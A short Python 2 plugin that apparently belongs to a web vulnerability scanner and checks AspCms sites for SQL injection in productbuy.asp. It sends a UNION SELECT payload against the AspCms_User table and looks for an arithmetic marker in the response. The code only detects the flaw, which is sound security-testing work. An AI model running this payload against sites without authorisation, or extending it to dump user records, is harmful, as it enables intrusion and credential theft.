#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="plug/productbuy.asp?id=-2+union+select+1,2,888888-1,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+AspCms_User"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
#       response,content=http.request(geturl)
        response,content=yx_httplib2_request(http,geturl)
        if content.find("888887")>=0:
            
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:AspCmsCookiesSqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:AspCmsCookiesSqlInjectionScript.py, run_domain function :" + str(e))
    return result

            